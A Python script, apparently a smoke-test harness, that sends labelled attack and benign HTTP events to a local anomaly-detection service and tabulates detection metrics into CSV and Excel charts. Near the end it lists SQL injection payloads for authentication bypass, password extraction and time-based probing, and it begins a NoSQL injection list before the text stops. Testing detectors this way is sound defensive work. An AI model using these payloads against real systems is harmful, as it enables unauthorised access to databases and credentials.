#!/usr/bin/env python3
import argparse
import csv
import datetime as dt
import json
import os
import sys
import time
import zlib
import requests
import re

from collections import defaultdict
from typing import Any, Dict, List, Optional, Tuple
from openpyxl import Workbook
from openpyxl.utils import get_column_letter
from openpyxl.chart import PieChart, DoughnutChart, BarChart, Reference
from openpyxl.chart.label import DataLabelList
from collections import Counter

# ---- Config / Defaults (same as bash script) ----
DEFAULT_BASE_URL = os.getenv("URL_ORCH", "http://localhost:8000")
DEFAULT_PATH_PROCESS = os.getenv("PATH_PROCESS", "/process")
DEFAULT_ONLY = os.getenv("ONLY", "")
DEFAULT_TOKEN = os.getenv("ORCH_TOKEN", "")
DEFAULT_PRETTY = os.getenv("PRETTY", "1")
DEFAULT_SEED = os.getenv("SEED", "")
QUIET = os.getenv("QUIET", "0").strip().lower() in ("1", "true", "yes", "on")

FAKE_IPS_PUBLIC = ["198.51.100.10", "198.51.100.42", "203.0.113.7", "203.0.113.77", "192.0.2.23"]
FAKE_IPS_PRIVATE = ["10.0.5.12", "10.1.2.3", "172.16.22.8", "192.168.1.44"]
FAKE_USERS = ["alice", "bob", "carol", "dave", "erin", "admin", "root", "svc-app"]
FAKE_LATENCY = ["121", "436", "697", "321", "506", "405", "793", "233", "132", "549", "435"]

ACCESS_LOG_RE = re.compile(
    r'^(?P<ip>\S+) \S+ \S+ \[(?P<ts>[^\]]+)\] '
    r'"(?P<method>\S+) (?P<path>\S+) (?P<proto>[^"]+)" '
    r'(?P<status>\d{3}) (?P<size>\S+) '
    r'"(?P<ref>[^"]*)" "(?P<ua>[^"]*)"'
)

ALERT_LEVELS = {"medium", "high", "critical"}
SUSPICIOUS_LEVELS = {"low", "medium", "high", "critical"}


def is_positive(risk_level: str, positive_levels: set[str]) -> bool:
    return normalize_risk_level(risk_level) in positive_levels

def parse_access_log_line(line: str) -> Optional[Dict[str, str]]:
    """
    Parse a standard Apache/Nginx combined log line.

    Returns a dict with method, path, ip, user_agent, referrer, status, size.
    If the line does not match the pattern, returns None.
    """
    m = ACCESS_LOG_RE.match(line.strip())
    if not m:
        return None

    d = m.groupdict()
    return {
        "ip": d.get("ip") or "",
        "method": d.get("method") or "GET",
        "path": d.get("path") or "/",
        "status": d.get("status") or "",
        "size": d.get("size") or "",
        "ref": d.get("ref") or "",
        "ua": d.get("ua") or "",
    }

def load_benign_from_log(
    path: str,
    max_events: int = 5000,
) -> List[Dict[str, Any]]:
    """
    Read access.log and build a list of "benign" events:
    endpoint, method, payload, source_ip, user_id, latency_ms.

    payload = path + referrer + user-agent so that the NLP pipeline sees realistic text.
    """
    events: List[Dict[str, Any]] = []

    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                if len(events) >= max_events:
                    break
                parsed = parse_access_log_line(line)
                if not parsed:
                    continue

                method = parsed["method"]

                path_full = parsed["path"]
                endpoint = path_full.split("?")[0] or "/"

                payload = f"{path_full} REF={parsed['ref']} UA={parsed['ua']}"

                latency = pick_latency("benign", len(events) + 1, "")

                ev = {
                    "endpoint": endpoint,
                    "method": method,
                    "payload": payload,
                    "source_ip": parsed["ip"],
                    # For benign traffic we can safely keep user_id empty
                    "user_id": "",
                    "latency_ms": latency,
                }
                events.append(ev)
    except FileNotFoundError:
        print(f"!! benign log file not found: {path}", file=sys.stderr)

    return events

def say(msg: str) -> None:
    if QUIET:
        return
    sys.stdout.write(f"\n\033[1;36m### {msg}\033[0m\n")

def arr_index(key: str, size: int, seed: str) -> int:
    """Deterministic index [0..size-1] from key+seed (similar to cksum in bash)."""
    if size <= 0:
        return 0
    data = (key + seed).encode("utf-8")
    h = zlib.crc32(data) & 0xFFFFFFFF
    return h % size


def pick_public_ip(group: str, idx: int, seed: str) -> str:
    n = len(FAKE_IPS_PUBLIC)
    ndx = arr_index(f"{group}-{idx}", n, seed)
    return FAKE_IPS_PUBLIC[ndx]


def pick_private_ip(group: str, idx: int, seed: str) -> str:
    n = len(FAKE_IPS_PRIVATE)
    ndx = arr_index(f"{group}-{idx}", n, seed)
    return FAKE_IPS_PRIVATE[ndx]


def pick_user(group: str, idx: int, seed: str) -> str:
    n = len(FAKE_USERS)
    ndx = arr_index(f"{group}-{idx}", n, seed)
    return FAKE_USERS[ndx]

def pick_latency(group: str, idx: int, seed: str) -> str:
    n = len(FAKE_LATENCY)
    ndx = arr_index(f"{group}-{idx}", n, seed)
    return FAKE_LATENCY[ndx]

def build_event(
    payload: str,
    endpoint: str,
    method: str,
    source_ip: str,
    user_id: str,
    latency: str
) -> Dict[str, Any]:
    ts = dt.datetime.now(dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    nonce = str(time.time_ns())
    return {
        "ts": ts,
        "endpoint": endpoint,
        "method": method,
        "headers": {"ct": "text"},
        "payload": payload,
        "latency_ms": latency,
        "trace_nonce": nonce,
        "source_ip": source_ip,
        "user_id": user_id or "",
    }


def pretty_json(obj: Any) -> str:
    try:
        return json.dumps(obj, ensure_ascii=False, indent=2)
    except Exception:
        return str(obj)


def send_request(
    session: requests.Session,
    url: str,
    detailed: bool,
    token: str,
    event: Dict[str, Any],
    attack_name: str,
    idx: int,
    pretty: bool,
) -> Tuple[str, Optional[Dict[str, Any]]]:
    endpoint = event.get("endpoint", "/?")
    method = event.get("method", "POST")

    say(f"{attack_name} #{idx} [{method} {endpoint}]")

    headers = {"Content-Type": "application/json"}
    if detailed and token:
        headers["X-Orch-Token"] = token

    body_obj = {"event": event}
    body_str = json.dumps(body_obj, ensure_ascii=False)
    query = "?detailed=1" if detailed else ""
    url_with_qs = f"{url}{query}"

    # Echo "curl" + body (skip in QUIET mode to reduce noise)
    if not QUIET:
        sys.stdout.write("# curl:\n")
        curl_parts = [
            "curl -sS -f",
            f'"{url_with_qs}"',
            "-H 'Content-Type: application/json'",
        ]
        if detailed and token:
            curl_parts.append(f"-H 'X-Orch-Token: {token}'")
        curl_parts.append("--data-binary @-")
        sys.stdout.write(" ".join(curl_parts) + "\n")
        sys.stdout.write(f"# endpoint: {method} {endpoint}\n")
        sys.stdout.write("# body:\n")
        sys.stdout.write(pretty_json(body_obj) + "\n")

    try:
        resp = session.post(
            url_with_qs,
            data=body_str.encode("utf-8"),
            headers=headers,
            timeout=15,
        )
    except Exception as e:
        sys.stdout.write(f"!! request failed for {attack_name}#{idx}: {e}\n")
        return "", None

    text = resp.text
    text_strip = text.strip()
    parsed: Optional[Dict[str, Any]] = None

    # try to parse JSON if present
    if text_strip.startswith("{") or text_strip.startswith("["):
        try:
            obj = json.loads(text_strip)
            if isinstance(obj, dict):
                parsed = obj
        except Exception:
            parsed = None

    # Print response (skip in QUIET mode to keep output compact)
    if not QUIET:
        if parsed is not None and detailed and pretty:
            sys.stdout.write(pretty_json(parsed) + "\n")
        else:
            sys.stdout.write(text_strip + "\n")
    return text_strip, parsed


def build_csv_row(
    event: Dict[str, Any],
    raw_response: str,
    parsed: Optional[Dict[str, Any]],
) -> Dict[str, Any]:
    row: Dict[str, Any] = {}

    # base fields
    row["timestamp"] = event.get("ts")
    row["endpoint"] = event.get("endpoint")
    row["method"] = event.get("method")
    row["payload"] = event.get("payload")
    row["latency_ms"] = event.get("latency_ms")
    row["trace_nonce"] = event.get("trace_nonce")
    row["source_ip"] = event.get("source_ip")
    row["user_id"] = event.get("user_id")
    row["attack_group"] = event.get("attack_group")
    g = str(row.get("attack_group") or "").strip()
    row["gt_label"] = "Benign" if g.lower() == "benign" else g
    row["pred_risk"] = "Normal"

    # raw human / json
    row["response_raw"] = " ".join(raw_response.split())

    if not parsed:
        row["human_text"] = row["response_raw"]
        return row

    # if parsed (detailed JSON) – trying to pull human tex
    row["hash_id"] = (
        parsed.get("hash_id")
        or parsed.get("fusion", {}).get("hash_id")
        or parsed.get("preprocess", {}).get("hash_id")
    )

    fusion = parsed.get("fusion", {}) if isinstance(parsed, dict) else {}
    ml = parsed.get("ml", {}) if isinstance(parsed, dict) else {}
    nlp = parsed.get("nlp", {}) if isinstance(parsed, dict) else {}
    human = parsed.get("human", {}) if isinstance(parsed, dict) else {}

    row["final_score"] = fusion.get("final_score")
    row["final_threshold"] = fusion.get("final_threshold")
    row["ml_score"] = ml.get("ml_score")
    row["nlp_score"] = nlp.get("nlp_score")
    row["risk_level"] = fusion.get("risk_level") or human.get("risk_level")
    row["fusion_mode"] = fusion.get("mode")
    row["fusion_is_anomaly"] = fusion.get("is_anomaly")

    # topic / topic-score
    topics = (
        fusion.get("topics")
        or nlp.get("topics")
        or parsed.get("alert", {}).get("preview", {}).get("topic")
    )
    if isinstance(topics, list) and topics:
        t0 = topics[0]
        row["topic"] = t0.get("topic")
        row["topic_score"] = t0.get("score")
    elif isinstance(topics, dict):
        row["topic"] = topics.get("topic")
        row["topic_score"] = topics.get("score")

    # Attack Type Identified
    row["attack_type_identified"] = row.get("topic")

    # Confidence
    conf = row.get("topic_score") or row.get("nlp_score") or row.get("final_score")
    row["confidence"] = conf

    # human_text in detailed mode
    row["human_text"] = (
        human.get("text")
        or parsed.get("human_text")
        or row.get("response_raw")
    )

    # risk context
    ctx = fusion.get("context") or parsed.get("preprocess", {}).get("risk_context") or {}
    if isinstance(ctx, dict):
        for k in ("env", "endpoint_class", "data_class", "auth_state", "exposure", "blast"):
            if k in ctx:
                row[k] = ctx[k]

    # route / thresholds
    route = parsed.get("route", {})
    if isinstance(route, dict):
        if route.get("ml_models") is not None:
            row["route_ml_models"] = ",".join(route.get("ml_models", []))
        if route.get("nlp_models") is not None:
            row["route_nlp_models"] = ",".join(route.get("nlp_models", []))
        fusion_cfg = route.get("fusion", {})
        if isinstance(fusion_cfg, dict):
            row["route_fusion_mode"] = fusion_cfg.get("mode")
        thresholds = route.get("thresholds", {})
        if isinstance(thresholds, dict):
            row["thr_ml"] = thresholds.get("ml")
            row["thr_nlp"] = thresholds.get("nlp")
            row["thr_final"] = thresholds.get("final")

    row["status"] = parsed.get("status")
    row["trace_id"] = parsed.get("trace_id") or ctx.get("trace_id")

    rn = normalize_risk_level(row.get("risk_level"))
    if rn not in ("critical", "high", "medium", "low", "normal"):
        rn = "normal"
    row["pred_risk"] = {
        "critical": "Critical",
        "high": "High",
        "medium": "Medium",
        "low": "Low",
        "normal": "Normal",
    }[rn]
    
    return row

def normalize_risk_level(x) -> str:
    if x is None:
        return "unknown"
    s = str(x).strip().lower()
    aliases = {
        "crit": "critical",
        "critical": "critical",
        "high": "high",
        "med": "medium",
        "medium": "medium",
        "low": "low",

        "normal": "normal",
        "no_risk": "normal",
        "norisk": "normal",
        "none": "normal",
        "info": "normal",
        "ok": "normal",
        "pass": "normal",

        "": "unknown",
    }
    return aliases.get(s, s)

def _risk_norm_5(x: Any) -> str:
    """Normalize to exactly one of: critical/high/medium/low/normal."""
    rn = normalize_risk_level(x)
    if rn not in ("critical", "high", "medium", "low", "normal"):
        return "normal"
    return rn

def _safe_div(a: float, b: float) -> float:
    return (a / b) if b else 0.0

def compute_mixed_confusion(rows: List[Dict[str, Any]], positive_levels: set[str]) -> Dict[str, Any]:
    """
    Single binary detection scheme (Reviewer-2 safe):
      gt_is_attack = (gt_label != "Benign")
      pred_is_attack = (pred_risk in positive_levels)
    """
    TP = FP = FN = TN = 0
    N_attack = N_benign = 0

    for r in rows:
        gt = str(r.get("gt_label") or r.get("attack_group") or "Benign").strip()
        gt_is_attack = (gt.lower() != "benign")

        pr = r.get("pred_risk") or r.get("risk_level")
        pred_r = _risk_norm_5(pr)
        pred_is_attack = (pred_r in positive_levels)

        if gt_is_attack:
            N_attack += 1
            if pred_is_attack:
                TP += 1
            else:
                FN += 1
        else:
            N_benign += 1
            if pred_is_attack:
                FP += 1
            else:
                TN += 1

    precision = _safe_div(TP, TP + FP)
    recall = _safe_div(TP, TP + FN)
    f1 = _safe_div(2 * precision * recall, precision + recall)
    fpr = _safe_div(FP, FP + TN)  # = FP / N_benign

    return {
        "N_total": N_attack + N_benign,
        "N_attack": N_attack,
        "N_benign": N_benign,
        "TP": TP, "FP": FP, "FN": FN, "TN": TN,
        "precision": precision,
        "recall": recall,
        "f1": f1,
        "fpr": fpr,
    }

def build_table2_mixed_traffic(rows: List[Dict[str, Any]]) -> Tuple[List[str], List[List[Any]]]:
    """
    Table 2. Mixed-traffic detection performance.
    """
    A = compute_mixed_confusion(rows, positive_levels=ALERT_LEVELS)       # Medium+
    B = compute_mixed_confusion(rows, positive_levels=SUSPICIOUS_LEVELS)  # Low+

    headers = [
        "Operating point",
        "Threshold rule",
        "N_total",
        "N_attack",
        "N_benign",
        "TP", "FP", "FN", "TN",
        "Precision (%)",
        "Recall (%)",
        "F1 (%)",
        "FPR (%)",
    ]

    def row(op_name: str, rule: str, d: Dict[str, Any]) -> List[Any]:
        return [
            op_name,
            rule,
            d["N_total"],
            d["N_attack"],
            d["N_benign"],
            d["TP"], d["FP"], d["FN"], d["TN"],
            round(d["precision"] * 100.0, 2),
            round(d["recall"] * 100.0, 2),
            round(d["f1"] * 100.0, 2),
            round(d["fpr"] * 100.0, 3),
        ]

    rows_out = [
        row("A — Alert (Medium+)", "pred_is_attack = pred_risk ∈ {Medium, High, Critical}", A),
        row("B — Suspicious (Low+)", "pred_is_attack = pred_risk ∈ {Low, Medium, High, Critical}", B),
    ]
    return headers, rows_out

def build_table3_risk_stratification(
    rows: List[Dict[str, Any]],
    group_order: List[str],
    group_labels: Dict[str, str],
) -> Tuple[List[str], List[List[Any]]]:
    """
    Table 3. Risk-level stratification by ground-truth class.
    No per-class TP/FP/TN/FN.
    """
    # counts[gt_label][risk] -> n
    counts = defaultdict(lambda: Counter())

    for r in rows:
        gt = str(r.get("gt_label") or r.get("attack_group") or "Benign").strip()
        # normalize gt for ordering: your generator uses internal ids (e.g., sql_injection, benign)
        gt_key = gt.lower()
        if gt_key == "benign":
            g = "benign"
        else:
            g = gt  # keep as-is (internal group id)

        pr = _risk_norm_5(r.get("pred_risk") or r.get("risk_level"))
        counts[g]["support"] += 1
        counts[g][pr] += 1

    headers = [
        "Ground-truth class",
        "Support (n)",
        "Critical (n)",
        "High (n)",
        "Medium (n)",
        "Low (n)",
        "Normal (n)",
        "Alert rate @Medium+ (%)",
    ]

    out = []
    for g in group_order:
        c = counts.get(g, Counter())
        support = int(c.get("support", 0))
        crit = int(c.get("critical", 0))
        high = int(c.get("high", 0))
        med  = int(c.get("medium", 0))
        low  = int(c.get("low", 0))
        norm = int(c.get("normal", 0))

        alert_rate = round(((crit + high + med) / support) * 100.0, 1) if support else 0.0

        out.append([
            group_labels.get(g, "Benign" if g == "benign" else g),
            support,
            crit, high, med, low, norm,
            alert_rate,
        ])

    return headers, out

def add_table_sheet(
    wb: Workbook,
    sheet_name: str,
    headers: List[str],
    rows: List[List[Any]],
    freeze_panes: str = "A2",
    percent_cols: Optional[set[int]] = None,  # 1-based indices
) -> None:
    if sheet_name in wb.sheetnames:
        del wb[sheet_name]
    ws = wb.create_sheet(title=sheet_name)

    ws.append(headers)
    for r in rows:
        ws.append(r)

    ws.freeze_panes = freeze_panes

    # number formats
    if percent_cols:
        for rr in range(2, ws.max_row + 1):
            for c in percent_cols:
                ws.cell(row=rr, column=c).number_format = "0.00"

    # auto-fit
    for idx, col in enumerate(headers, start=1):
        col_letter = get_column_letter(idx)
        vals = [str(ws.cell(row=r, column=idx).value or "") for r in range(1, ws.max_row + 1)]
        max_len = max(len(col), *(len(v) for v in vals)) if vals else len(col)
        ws.column_dimensions[col_letter].width = min(max_len + 2, 70)

def run_group(
    session: requests.Session,
    base_url: str,
    path_process: str,
    detailed: bool,
    token: str,
    pretty: bool,
    only_group: str,
    group_name: str,
    endpoint: str,
    method: str,
    payloads: List[str],
    seed: str,
    csv_rows: Optional[List[Dict[str, Any]]],
    attack_budget: Optional[int] = None,
) -> int:

    if only_group and only_group != group_name:
        return 0

    url = base_url.rstrip("/") + path_process
    sent = 0

    for idx, pl in enumerate(payloads, start=1):
        if attack_budget is not None and sent >= int(attack_budget):
            break
        # IP/user selection logic is the same as in the bash script
        if group_name in {
            "sql_injection",
            "nosql_injection",
            "ldap_injection",
            "cmd_injection",
            "xss",
            "ssrf",
            "websocket",
            "ssrf_sensitive",
            "business_logic",
            "api_key_exposure",
        }:
            ip = pick_public_ip(group_name, idx, seed)
            user = ""
            latency = pick_latency(group_name, idx, seed)
        elif group_name in {"auth_bruteforce", "credential_stuffing"}:
            ip = pick_public_ip(group_name, idx, seed)
            user = "admin"
            latency = pick_latency(group_name, idx, seed)
        elif group_name == "idor":
            ip = pick_public_ip(group_name, idx, seed)
            user = f"user{idx}"
            latency = pick_latency(group_name, idx, seed)
        elif group_name in {"data_exposure", "misconfiguration"}:
            ip = pick_private_ip(group_name, idx, seed)
            user = pick_user(group_name, idx, seed)
            latency = pick_latency(group_name, idx, seed)
        elif group_name == "dos":
            ip = pick_public_ip(group_name, 1, seed)
            user = ""
            latency = pick_latency(group_name, idx, seed)
        else:
            ip = ""
            user = ""
            latency = pick_latency(group_name, idx, seed)

        event = build_event(pl, endpoint, method, ip, user, latency)
        event["attack_group"] = group_name
        raw, parsed = send_request(
            session=session,
            url=url,
            detailed=detailed,
            token=token,
            event=event,
            attack_name=group_name,
            idx=idx,
            pretty=pretty,
        )
        if csv_rows is not None:
            csv_rows.append(build_csv_row(event, raw_response=raw, parsed=parsed))
        sent += 1
    return sent

def run_benign_events(
    session: requests.Session,
    base_url: str,
    path_process: str,
    detailed: bool,
    token: str,
    pretty: bool,
    benign_events: List[Dict[str, Any]],
    csv_rows: Optional[List[Dict[str, Any]]],
) -> None:
    """
    Send "benign" events from access.log through /process.

    We do not modify endpoint/method/ip from the log; we just build an event
    and forward it to the orchestrator.
    """
    if not benign_events:
        return

    url = base_url.rstrip("/") + path_process

    for idx, ev in enumerate(benign_events, start=1):
        endpoint = ev["endpoint"]
        method = ev["method"]
        payload = ev["payload"]
        source_ip = ev["source_ip"]
        user_id = ev["user_id"]
        latency = ev["latency_ms"]

        # Use the same build_event, but do NOT overwrite ip/user
        event = build_event(
            payload=payload,
            endpoint=endpoint,
            method=method,
            source_ip=source_ip,
            user_id=user_id,
            latency=latency,
        )
        # Mark the group so that CSV clearly shows this is benign traffic
        event["attack_group"] = "benign"

        raw, parsed = send_request(
            session=session,
            url=url,
            detailed=detailed,
            token=token,
            event=event,
            attack_name="benign",
            idx=idx,
            pretty=pretty,
        )
        if csv_rows is not None:
            csv_rows.append(build_csv_row(event, raw_response=raw, parsed=parsed))

def _dl_values(num_fmt: str = "0") -> DataLabelList:
    dl = DataLabelList()
    dl.showVal = True
    dl.showPercent = False
    dl.showCatName = False
    dl.showSerName = False
    dl.showLegendKey = False
    dl.numFmt = num_fmt
    return dl

def _dl_val_and_cat(num_fmt: str = "0") -> DataLabelList:
    """Show BOTH value and category name on bars (helps when axis tick labels are not visible)."""
    dl = DataLabelList()
    dl.showVal = True
    dl.showCatName = True
    dl.showPercent = False
    dl.showSerName = False
    dl.showLegendKey = False
    dl.numFmt = num_fmt
    return dl

def add_charts_from_table2(
    wb: Workbook,
    table_sheet: str = "table2_mixed_traffic",
    out_sheet: str = "charts_table2",
) -> None:
    if table_sheet not in wb.sheetnames:
        return

    src = wb[table_sheet]

    n_attack = int(src.cell(row=2, column=4).value or 0)
    n_benign = int(src.cell(row=2, column=5).value or 0)
    total = max(1, n_attack + n_benign)

    prec_A = float(src.cell(row=2, column=10).value or 0.0)
    rec_A  = float(src.cell(row=2, column=11).value or 0.0)
    f1_A   = float(src.cell(row=2, column=12).value or 0.0)
    fpr_A  = float(src.cell(row=2, column=13).value or 0.0)

    prec_B = float(src.cell(row=3, column=10).value or 0.0)
    rec_B  = float(src.cell(row=3, column=11).value or 0.0)
    f1_B   = float(src.cell(row=3, column=12).value or 0.0)
    fpr_B  = float(src.cell(row=3, column=13).value or 0.0)

    if out_sheet in wb.sheetnames:
        del wb[out_sheet]
    ws = wb.create_sheet(title=out_sheet)

    # ---- Pie (attacks vs benign) ----
    ws["A1"] = "Class"
    ws["B1"] = "Count"
    ws["C1"] = "Share (%)"
    ws["D1"] = "Legend label"

    att_share = (n_attack / total) * 100.0
    ben_share = (n_benign / total) * 100.0

    ws["A2"] = "Attacks"
    ws["B2"] = n_attack
    ws["C2"] = round(att_share, 1)
    ws["D2"] = f"Attacks — {n_attack} ({att_share:.1f}%)"

    ws["A3"] = "Benign"
    ws["B3"] = n_benign
    ws["C3"] = round(ben_share, 1)
    ws["D3"] = f"Benign — {n_benign} ({ben_share:.1f}%)"

    pie = PieChart()
    pie.title = "Mixed traffic: Attacks vs Benign"
    pie.add_data(Reference(ws, min_col=2, min_row=2, max_row=3), titles_from_data=False)
    pie.set_categories(Reference(ws, min_col=4, min_row=2, max_row=3))
    pie.dataLabels = _dl_values(num_fmt="0")
    pie.width = 18
    pie.height = 10
    ws.add_chart(pie, "F1")

    # ---- Trade-off bars (Table 2) ----
    ws["A6"] = "Metric"
    ws["B6"] = "A — Alert (Medium+)"
    ws["C6"] = "B — Suspicious (Low+)"

    metrics = [
        ("Precision (%)", prec_A, prec_B),
        ("Recall (%)",    rec_A,  rec_B),
        ("F1 (%)",        f1_A,   f1_B),
        ("FPR (%)",       fpr_A,  fpr_B),
    ]
    for i, (m, a, b) in enumerate(metrics, start=7):
        ws.cell(row=i, column=1).value = m
        ws.cell(row=i, column=2).value = float(a)
        ws.cell(row=i, column=3).value = float(b)

    bar = BarChart()
    bar.type = "bar"
    bar.grouping = "clustered"
    bar.title = "Operating-point trade-off (Table 2)"

    # IMPORTANT: for type="bar" Excel/openpyxl часто “міняє місцями” підписи осей,
    # тому ставимо так, щоб візуально було правильно:
    bar.x_axis.title = "Metric"
    bar.y_axis.title = "Percent (%)"

    data = Reference(ws, min_col=2, min_row=6, max_col=3, max_row=10)  # includes header row (6)
    cats = Reference(ws, min_col=1, min_row=7, max_row=10)             # metric names
    bar.add_data(data, titles_from_data=True)
    bar.set_categories(cats)

    # Show metric name on bars + value (fixes "no metric labels" issue)
    bar.dataLabels = _dl_val_and_cat(num_fmt="0.00")
    bar.width = 26
    bar.height = 11
    ws.add_chart(bar, "F13")


def add_charts_from_table3(
    wb: Workbook,
    table_sheet: str = "table3_risk_stratification",
    out_sheet: str = "charts_table3",
    include_benign: bool = False,
) -> None:
    if table_sheet not in wb.sheetnames:
        return

    src = wb[table_sheet]

    classes = []
    total_events_all = 0

    for r in range(2, src.max_row + 1):
        cls = src.cell(row=r, column=1).value
        if not cls:
            continue
        cls_s = str(cls).strip()
        support = int(src.cell(row=r, column=2).value or 0)
        total_events_all += support

        if (not include_benign) and cls_s.lower() == "benign":
            continue

        # Table 3 columns:
        # 3 Crit, 4 High, 5 Med, 6 Low, 7 Normal, 8 Alert rate
        crit = int(src.cell(row=r, column=3).value or 0)
        high = int(src.cell(row=r, column=4).value or 0)
        med  = int(src.cell(row=r, column=5).value or 0)
        low  = int(src.cell(row=r, column=6).value or 0)
        norm = int(src.cell(row=r, column=7).value or 0)
        ar   = float(src.cell(row=r, column=8).value or 0.0)

        classes.append({
            "name": cls_s,
            "support": support,
            "share": (support / max(1, total_events_all)) * 100.0,  # updated after total known, but ok for rough; we’ll recompute
            "normal": norm,
            "low": low,
            "medium": med,
            "high": high,
            "critical": crit,
            "alert_rate": ar,
        })

    total_events_all = max(1, total_events_all)

    # recompute share precisely + sort by SUPPORT desc (largest on top)
    for c in classes:
        c["share"] = (c["support"] / total_events_all) * 100.0
    classes.sort(key=lambda x: x["support"], reverse=True)

    if out_sheet in wb.sheetnames:
        del wb[out_sheet]
    ws = wb.create_sheet(title=out_sheet)

    # ---- Build chart-data table: rows=classes, cols=risk levels (batched by risk level as SERIES) ----
    ws["A1"] = "Class"
    ws["B1"] = "Support (n)"
    ws["C1"] = "Share (%)"
    ws["D1"] = "Normal (n)"
    ws["E1"] = "Low (n)"
    ws["F1"] = "Medium (n)"
    ws["G1"] = "High (n)"
    ws["H1"] = "Critical (n)"
    ws["I1"] = "Alert rate @Medium+ (%)"

    for i, c in enumerate(classes, start=2):
        ws.cell(row=i, column=1).value = c["name"]
        ws.cell(row=i, column=2).value = int(c["support"])
        ws.cell(row=i, column=3).value = float(round(c["share"], 1))
        ws.cell(row=i, column=4).value = int(c["normal"])
        ws.cell(row=i, column=5).value = int(c["low"])
        ws.cell(row=i, column=6).value = int(c["medium"])
        ws.cell(row=i, column=7).value = int(c["high"])
        ws.cell(row=i, column=8).value = int(c["critical"])
        ws.cell(row=i, column=9).value = float(c["alert_rate"])

    last_row = 1 + len(classes)

    # ---- Chart 1: Risk-level distribution (batched by risk level; classes on Y) ----
    dist = BarChart()
    dist.type = "bar"
    dist.grouping = "clustered"
    dist.title = "Risk-level distribution by ground-truth class (Table 3)"

    # same axis-title quirk handling for horizontal bar charts:
    dist.x_axis.title = "Class"
    dist.y_axis.title = "Count (n)"

    # data = risk columns D..H (Normal..Critical)
    data = Reference(ws, min_col=4, min_row=1, max_col=8, max_row=last_row)
    cats = Reference(ws, min_col=1, min_row=2, max_row=last_row)

    dist.add_data(data, titles_from_data=True)
    dist.set_categories(cats)

    # show values (counts)
    dist.dataLabels = _dl_values(num_fmt="0")
    dist.width = 42
    dist.height = max(14, 0.7 * len(classes) + 8)

    # put biggest class on top
    dist.y_axis.scaling.orientation = "maxMin"

    ws.add_chart(dist, "K2")

    # ---- Chart 2: Alert rate @Medium+ by class (sorted by SUPPORT desc) ----
    start_row = last_row + 4
    ws.cell(row=start_row, column=1).value = "Class — n (share of all events)"
    ws.cell(row=start_row, column=2).value = "Alert rate @Medium+ (%)"

    for i, c in enumerate(classes, start=start_row + 1):
        label = f"{c['name']} — {c['support']} ({c['share']:.1f}%)"
        ws.cell(row=i, column=1).value = label
        ws.cell(row=i, column=2).value = float(c["alert_rate"])

    ar_bar = BarChart()
    ar_bar.type = "bar"
    ar_bar.grouping = "clustered"
    ar_bar.title = "Alert rate @Medium+ by class (Table 3)"

    ar_bar.x_axis.title = "Class"
    ar_bar.y_axis.title = "Percent (%)"

    ar_data = Reference(ws, min_col=2, min_row=start_row, max_row=start_row + len(classes))
    ar_cats = Reference(ws, min_col=1, min_row=start_row + 1, max_row=start_row + len(classes))

    ar_bar.add_data(ar_data, titles_from_data=True)
    ar_bar.set_categories(ar_cats)

    ar_bar.dataLabels = _dl_values(num_fmt="0.0")
    ar_bar.y_axis.scaling.orientation = "maxMin"

    ar_bar.width = 42
    ar_bar.height = max(16, 0.7 * len(classes) + 10)

    ws.add_chart(ar_bar, "K22")

def main() -> None:
    parser = argparse.ArgumentParser(
        description="OWASP Top-10 smoke test, with optional CSV/XLSX export."
    )
    parser.add_argument("--url", default=DEFAULT_BASE_URL, help="Base Orchestrator URL (without /process)")
    parser.add_argument(
        "--path-process",
        default=DEFAULT_PATH_PROCESS,
        help="Path for the process endpoint (default: /process)",
    )
    parser.add_argument(
        "--detailed",
        action="store_true",
        help="Call /process?detailed=1 (X-Orch-Token recommended).",
    )
    parser.add_argument(
        "--only",
        default=DEFAULT_ONLY,
        help="Run only one group (sql_injection, xss, dos, business_logic...).",
    )
    parser.add_argument(
        "--token",
        default=DEFAULT_TOKEN,
        help="Override ORCH_TOKEN from env.",
    )
    parser.add_argument(
        "--no-pretty",
        action="store_true",
        help="Do not pretty-print JSON, even in detailed mode.",
    )
    parser.add_argument(
        "--csv-out",
        default="",
        help="Write results to CSV at this path (if omitted — CSV is not written).",
    )
    parser.add_argument(
        "--xlsx-out",
        "--xslx",              # to work even if --xslx is used
        dest="xlsx_out",
        default="",
        help="Write results to Excel (.xlsx) at this path.",
    )
    parser.add_argument(
        "--seed",
        default=DEFAULT_SEED,
        help="Seed for deterministic selection of IP/user.",
    )
    parser.add_argument(
        "--loops",
        type=int,
        default=1,
        help="How many times to repeat the full set of OWASP scenarios (default: 1).",
    )
    parser.add_argument(
        "--attack-max",
        type=int,
        default=0,
        help="Maximum number of attack events to send (0 = no cap).",
    )
    parser.add_argument(
        "--benign-log-path",
        default="",
        help="Path to access.log file containing benign HTTP traffic.",
    )
    parser.add_argument(
        "--benign-max",
        type=int,
        default=5000,
        help="Maximum number of benign events to send from access.log.",
    )
    parser.add_argument(
        "--benign-multiplier",
        type=float,
        default=9.0,
        help="How many benign events per 1 attack event (~9.0 ≈ 90% benign / 10% attacks).",
    )
    parser.add_argument(
        "--benign-loops",
        "--benign-loop",
        type=int,
        default=1,
        help="How many times to repeat benign traffic sending (default: 1).",
    )

    args = parser.parse_args()
    csv_out = (args.csv_out or "").strip()
    xlsx_out = (args.xlsx_out or "").strip()

    base_url = args.url
    path_process = args.path_process
    only_group = (args.only or "").strip()
    token = args.token.strip()
    detailed = bool(args.detailed)
    pretty = not args.no_pretty and DEFAULT_PRETTY != "0"
    seed = args.seed or ""
    loops = max(1, int(args.loops))
    attack_max = max(0, int(args.attack_max))
    benign_loops = max(1, int(args.benign_loops))
    benign_log_path = (args.benign_log_path or "").strip()
    benign_max = int(args.benign_max)
    benign_multiplier = float(args.benign_multiplier)

    url_full = base_url.rstrip("/") + path_process
    print(f"Target Orchestrator URL: {url_full}")
    
    t_start = time.perf_counter()

    # ---- payloads (same as bash version) ----
    SQLI = [
        "admin' OR '1'='1' --",
        "UNION SELECT username, password FROM users--",
        "';waitfor delay '0:0:3'--",
        "admin' or 1=1;--",
        "admin' OR '1'='1' --",
        "admin' or '1'='1' /*x*/",
        "' or 1=1 LIMIT 1 --",
        "' or sleep(5)--",
        "';waitfor delay '0:0:3'--",
        "') or sleep(2)='",
        "' or 'a'='a' --",
        "UNION SELECT 1,2,3--",
        "unIoN/**/SeLeCt user,pass frOm users--",
        "UNI/**/ON SEL/**/ECT @@version;--",
        "union all select null,null--",
    ]
    NOSQL = [
        "db.users.find({$where:'this.password != null'})",
